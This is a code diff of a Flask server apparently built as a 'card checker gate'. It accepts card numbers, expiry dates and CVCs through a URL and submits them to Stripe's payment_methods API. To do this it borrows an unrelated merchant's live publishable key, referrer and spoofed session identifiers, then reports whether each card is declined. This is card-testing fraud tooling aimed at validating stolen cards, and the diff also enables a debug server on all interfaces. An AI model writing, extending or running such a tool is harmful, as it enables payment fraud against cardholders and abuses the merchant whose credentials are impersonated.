@@ -3,16 +3,37 @@ import requests
 import json
 import sys
 import re
-import threading
-import time
 
 app = Flask(__name__)
 
-def process_payment(card_details):
+def process_card(card_input):
     """
-    Process the payment using Stripe API and the merchant's endpoint.
-    Returns a dictionary with status and response message.
+    Process credit card details in pipe format and return the result.
+    Format: card_number|exp_month|exp_year|cvc|postal_code|country
+    Example: 4242424242424242|12|25|123|10001|US
     """
+    # Parse the input
+    parts = card_input.split('|')
+    if len(parts) < 4:
+        # Output error in JSON format
+        return {"status": "declined", "response": "Your card was declined."}
+    
+    card_number = parts[0].replace(' ', '')  # Remove spaces
+    exp_month = parts[1]
+    exp_year = parts[2]
+    cvc = parts[3]
+    postal_code = parts[4] if len(parts) > 4 else "10001"
+    country = parts[5] if len(parts) > 5 else "US"
+    
+    card_details = {
+        'card_number': card_number,
+        'exp_month': exp_month,
+        'exp_year': exp_year,
+        'cvc': cvc,
+        'postal_code': postal_code,
+        'country': country
+    }
+    
     # Second request: POST to api.stripe.com/v1/payment_methods
     headers2 = {
         'accept': 'application/json',
@@ -33,7 +54,7 @@ def process_payment(card_details):
     }
 
     # Format card details for the request
-    data2 = f'type=card&card[number]={card_details["card_number"]}&card[cvc]={card_details["cvc"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]={card_details["postal_code"]}&billing_details[address][country]={card_details["country"]}&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbentleylanecreations.com&time_on_page=1283073&client_attribution_metadata[client_session_id]=4930c9af-0300-48f6-b89d-60782fe69360&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=a6f8ef0f-8e7d-4cbe-84f3-78167f3de01c&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=55c950db-485d-4bbe-8c83-e79cb9bf493df4dc3f&muid=79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2&sid=e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908&key=pk_live_51MuQ36JxXE8UJEXgPLz36wlHls4AV6nvgFtgtKRs7gjnFdsSKf3X4Onv4d8TkUjona7eCoT6uzxTXirEhtzCI4s600qxDdWqul&_stripe_version=2024-06-20'
+    data2 = f'type=card&card[number]={card_details["card_number"]}&card[cvc]={card_details["cvc"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]={card_details["postal_code"]}&billing_details[address][country]={card_details["country"]}&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbentleylanecreations.com&time_on_page=1283073&client_attribution_metadata[client_session_id]=4930c9af-0300-48f6-b89d-60782fe69360&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=55c950db-485d-4bbe-8c83-e79cb9bf493df4dc3f&muid=79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2&sid=e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908&key=pk_live_51MuQ36JxXE8UJEXgPLz36wlHls4AV6nvgFtgtKRs7gjnFdsSKf3X4Onv4d8TkUjona7eCoT6uzxTXirEhtzCI4s600qxDdWqul&_stripe_version=2024-06-20'
 
     # Extract payment method ID from response2
     try:
@@ -157,59 +178,16 @@ def process_payment(card_details):
     except Exception as e:
         return {"status": "declined", "response": "Your card was declined."}
 
-@app.route('/gate=stauth/cc+<card_info>')
-def process_card(card_info):
-    """
-    Process card information from the URL.
-    Format: card_number|exp_month|exp_year|cvc|postal_code|country
-    """
-    try:
-        # Parse the card information from the URL
-        # Format: card_number|exp_month|exp_year|cvc|postal_code|country
-        parts = card_info.split('|')
-        
-        # Validate the input
-        if len(parts) < 4:
-            return jsonify({"status": "declined", "response": "Invalid card format. Expected: card_number|exp_month|exp_year|cvc|postal_code|country"})
-        
-        card_number = parts[0].replace(' ', '')  # Remove spaces
-        exp_month = parts[1]
-        exp_year = parts[2]
-        
-        # Handle both 2-digit and 4-digit year formats
-        if len(exp_year) == 2:
-            exp_year = '20' + exp_year
-        
-        cvc = parts[3]
-        postal_code = parts[4] if len(parts) > 4 else "10001"
-        country = parts[5] if len(parts) > 5 else "US"
-        
-        card_details = {
-            'card_number': card_number,
-            'exp_month': exp_month,
-            'exp_year': exp_year,
-            'cvc': cvc,
-            'postal_code': postal_code,
-            'country': country
-        }
-        
-        # Process the payment
-        result = process_payment(card_details)
-        
-        # Return the result
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({"status": "declined", "response": "An error occurred while processing your request."})
-
-# Add a root endpoint for health checks
-@app.route('/')
-def index():
-    return jsonify({"status": "running", "message": "Card processing server is running"})
-
-# Add a status endpoint
-@app.route('/status')
-def status():
-    return jsonify({"status": "running", "message": "Card processing server is running"})
+@app.route('/gate=stauth/cc=<path:card_details>', methods=['GET'])
+def process_payment(card_details):
+    # Decode URL-encoded characters
+    card_details = card_details.replace('%7C', '|')
+    
+    # Process the card
+    result = process_card(card_details)
+    
+    # Return the result as JSON
+    return jsonify(result)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
+    app.run(host='0.0.0.0', port=5000, debug=True)
